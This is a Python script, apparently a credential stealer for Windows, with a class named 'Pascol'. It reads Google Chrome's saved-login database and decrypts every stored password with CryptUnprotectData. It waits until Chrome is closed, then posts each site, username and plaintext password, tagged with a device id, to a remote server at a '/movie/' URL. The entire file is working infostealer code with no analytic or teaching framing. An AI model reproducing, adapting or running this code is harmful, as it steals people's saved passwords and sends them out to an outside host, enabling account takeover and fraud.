from wmi import WMI
from os.path import expanduser, join
import sqlite3
from win32 import win32crypt
import requests
import uuid


class Pascol:
    def __init__(self):
        self.server_url = "http://192.168.100.12/movie/"
        self.log = open("log.txt", "w")

    def getUserPass(self):
        # path to user's login data
        data_path = expanduser(
            '~')+"/AppData/Local/Google/Chrome/User Data/Default"
        login_db = join(data_path, 'Login Data')
        # db connect and query
        c = sqlite3.connect(login_db)
        cursor = c.cursor()
        select_statement = "SELECT origin_url, username_value, password_value FROM logins"
        try:
            cursor.execute(select_statement)
            login_data = cursor.fetchall()
            cursor.close()
        except:
            pass
        # URL: credentials dictionary
        credential = {}
        final_data = []
        # decrytping the password
        for url, user_name, pwd, in login_data:
            # This returns a tuple description and the password
            pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
            credential[url] = (user_name, pwd[1])
        for url, credentials in credential.items():
            if credentials[1]:
                final_data.append(
                    {'url': url, 'user': credential[url][0], 'password': credential[url][1].decode('utf-8')})
        return final_data

    def chromeStatus(self):
        c = WMI()
        for process in c.Win32_Process():
            if process.Name == 'chrome.exe':
                return True
        return False

    def sendData(self, server_url, dada, device_id):

        for dt in dada:
            dt['device_id'] = device_id
            PARAMS = dt
            try:
                x = requests.post(url=server_url, data=PARAMS)
                self.log.write(x.text+'\n')
            except Exception as e:
                self.log.write(str(e)+'\n')
                pass

    def run(self):
        device_id = uuid.getnode()
        self.log.write(str(device_id)+'\n')
        while True:
            if not self.chromeStatus():
                try:
                    self. sendData(self.server_url,
                                   self. getUserPass(), device_id)
                except Exception as e:
                    self.log.write(str(e)+'\n')
                    self.log.close()
                break
